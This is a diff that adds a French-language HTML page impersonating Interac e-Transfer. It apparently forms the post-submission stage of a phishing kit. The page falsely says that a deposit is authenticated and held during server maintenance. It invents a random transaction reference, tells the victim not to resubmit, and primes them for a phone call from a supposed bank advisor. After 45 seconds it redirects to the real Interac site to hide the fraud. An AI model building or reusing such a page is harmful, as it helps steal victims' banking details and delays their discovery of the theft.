@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Statut du Transfert - Interac e-Transfer</title>
+    <style>
+        body { font-family: -apple-system, sans-serif; background: #f4f7f9; color: #333; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
+        .container { background: white; max-width: 450px; width: 90%; padding: 40px 25px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); text-align: center; border-top: 6px solid #ffbf00; }
+        
+        .status-icon { width: 65px; margin-bottom: 20px; }
+        h2 { color: #2b2b18; margin-bottom: 15px; font-size: 22px; }
+        
+        .info-box { background: #fff9e6; border: 1px solid #ffeeba; padding: 20px; border-radius: 8px; text-align: left; margin-bottom: 25px; }
+        .info-box p { margin: 0; font-size: 14px; line-height: 1.6; color: #555; }
+        
+        .reference { font-family: 'Courier New', monospace; font-weight: bold; background: #eee; padding: 4px 10px; border-radius: 4px; color: #333; }
+        
+        .footer-notice { font-size: 13px; color: #888; margin-top: 30px; line-height: 1.4; }
+        .progress-bar { width: 100%; height: 4px; background: #eee; margin-top: 20px; border-radius: 2px; overflow: hidden; }
+        .progress-fill { width: 0%; height: 100%; background: #ffbf00; transition: width 45s linear; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://i.postimg.cc/Pr51t7b7/IMG-6655.png" class="status-icon" alt="Interac">
+    
+    <h2>Traitement en cours...</h2>
+    
+    <div class="info-box">
+        <p>
+            <strong>Note technique :</strong> Le réseau <i>Interac</i> procède actuellement à une mise à jour de sécurité programmée de ses serveurs de compensation. 
+            <br><br>
+            Votre dépôt de fonds a été <b>correctement authentifié et mis en attente sécurisée</b>. Les fonds seront crédités sur votre compte dès la fin de la maintenance (délai estimé : 2 à 4 heures).
+        </p>
+    </div>
+
+    <p style="font-size: 15px;">Référence de transaction : <span class="reference" id="ref-num">INT-GENERATING...</span></p>
+
+    <div class="footer-notice">
+        Un conseiller de votre institution financière pourrait vous contacter par téléphone en cas de besoin pour finaliser la synchronisation. <br><br>
+        <strong>Veuillez ne pas renouveler la demande pour éviter tout doublon.</strong>
+    </div>
+
+    <div class="progress-bar">
+        <div class="progress-fill" id="fill"></div>
+    </div>
+    <p style="font-size: 11px; color: #bbb; margin-top: 10px;">Redirection vers le portail Interac dans <span id="timer">45</span>s...</p>
+</div>
+
+<script>
+    window.onload = function() {
+        // 1. Génération de la référence aléatoire
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        let res = 'INT-';
+        for (let i = 0; i < 7; i++) res += chars.charAt(Math.floor(Math.random() * chars.length));
+        document.getElementById('ref-num').innerText = res;
+
+        // 2. Animation visuelle de la barre
+        setTimeout(() => {
+            document.getElementById('fill').style.width = '100%';
+        }, 100);
+
+        // 3. Gestion du compte à rebours texte (optionnel mais rassurant)
+        let timeLeft = 45;
+        const countdown = setInterval(() => {
+            timeLeft--;
+            if(document.getElementById('timer')) {
+                document.getElementById('timer').innerText = timeLeft;
+            }
+            if(timeLeft <= 0) clearInterval(countdown);
+        }, 1000);
+
+        // 4. REDIRECTION PRINCIPALE (45 secondes)
+        setTimeout(function() {
+            window.location.replace("https://www.interac.ca/fr/");
+        }, 45000);
+
+        // 5. REDIRECTION DE SECOURS (Si la page ne bouge toujours pas)
+        setTimeout(function() {
+            window.location.href = "https://www.interac.ca/fr/";
+        }, 48000);
+    };
+</script>
+
+</body>
+</html>
